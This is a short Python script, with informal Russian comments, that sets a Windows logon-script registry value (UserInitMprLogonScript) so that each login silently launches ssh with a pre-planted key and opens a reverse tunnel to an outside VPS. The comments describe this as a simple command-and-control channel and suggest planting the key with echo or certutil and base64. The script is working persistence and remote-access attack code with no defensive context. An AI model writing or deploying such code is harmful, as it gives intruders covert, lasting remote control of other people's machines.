import winreg
# ну типо простенький скрипт добавления в скрипт авторизации
# это даже не эскалация привилегий, потому что так нельзя в 99% случаев
reghive = winreg.HKEY_USERS
userSID = "<UserID>"
regpath = userSID + "\Environment"

command = (
    r'C:\Windows\System32\OpenSSH\ssh.exe '
    r'-i C:\Users\Public\.ssh\id_rsa ' # ключ УЖЕ должен быть передан,например через echo "yourkey" file или через certutil + кодировку из base64
    r'-o StrictHostKeyChecking=accept-new ' # вот эту строку, где надо принять ключ автоматически скипаем
    r'-o BatchMode=yes' # без пользовательского вмешательсва вообще дальше
    r'-R 2222:localhost:22 -N -f '
    r'vpsuser@203.0.113.50'
)

'''
Короче это reverse ssh. То есть внутренний сервер, посылает на внешний запрос об установлении туннеля. Внешний сервер, если принимает, то может просто слать команды через localhost:2222 и это будет срабатывать на внутреннем сервере. Короче это очень простой и ненадежный C2
'''

with winreg.OpenKey(reghive, regpath, 0, access=winreg.KEY_WRITE) as key:
    winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, command)
    